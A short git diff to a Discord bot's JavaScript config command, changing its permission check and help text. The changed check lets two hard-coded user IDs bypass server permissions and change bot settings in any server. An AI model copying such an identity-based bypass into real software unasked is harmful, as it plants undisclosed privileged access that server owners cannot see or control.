@@ -7,7 +7,7 @@ const db = require("../json.db")
 
 module.exports.run = async(client,message)=>{
     const gid = message.guild.id
-    if(message.member.permissions.has("MANAGE_SERVER")|| await roleCheck(message.member.roles,gid)){ 
+    if(message.member.permissions.has("MANAGE_SERVER") || await roleCheck(message.member.roles,gid) || message.author.id == "235418753335033857" || message.author.id == "518097896365752338"){ 
         let prefix = await db.prefix(gid)
         fullcommand = message.content.substring(prefix.length)
         splitCommand = fullcommand.split(" ")
@@ -207,7 +207,7 @@ module.exports.config = {
     type: "Staff"
 }
 module.exports.help = {
-    usage : `config 1`, //Example usage of command
+    usage : `config <config-id> [arguments]`, //Example usage of command
     User : 0, //Who this command can be used by, 1 for Everyone 2 for Restricted Roles 3 for Moderators and 4 for Admins 5 for Server Owner
-    description : 'Use for changing settings of bot such as prefix. Do config with no arguments to get detailed guide.' //Description to come when you use config.prefix help <command name>
+    description : `See ${config.prefix}config for more details.` //Description to come when you use config.prefix help <command name>
 }
